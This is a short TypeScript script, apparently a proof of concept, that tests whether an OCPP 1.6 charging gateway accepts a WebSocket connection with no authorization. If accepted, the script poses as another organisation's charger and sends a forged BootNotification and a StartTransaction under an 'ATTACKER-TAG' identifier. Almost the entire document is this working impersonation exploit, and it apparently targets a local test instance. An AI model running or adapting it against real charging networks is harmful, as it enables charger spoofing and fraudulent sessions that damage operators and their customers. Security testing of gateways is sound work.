import WebSocket from 'ws';
const GW='ws://127.0.0.1:9720/ocpp';
const id = 'RIVAL-DC180-XYZ-001'; // org B's charger identity
const ws = new WebSocket(`${GW}/${encodeURIComponent(id)}`, ['ocpp1.6']); // NO Authorization header
ws.on('unexpected-response',(_r,res)=>{console.log('REJECTED HTTP'+res.statusCode);process.exit(0);});
ws.on('open',()=>{
  console.log('UNAUTH PEER ACCEPTED as org-B charger '+id);
  ws.send(JSON.stringify([2,'b','BootNotification',{chargePointVendor:'ATTACKER',chargePointModel:'PWN',firmwareVersion:'evil'}]));
  ws.send(JSON.stringify([2,'st','StartTransaction',{connectorId:1,idTag:'ATTACKER-TAG',meterStart:0,timestamp:new Date().toISOString()}]));
  setTimeout(()=>{ws.close();process.exit(0);},1500);
});
ws.on('message',d=>console.log('<-',d.toString().slice(0,150)));
ws.on('error',e=>{console.log('ERR',(e as Error).message);process.exit(0);});
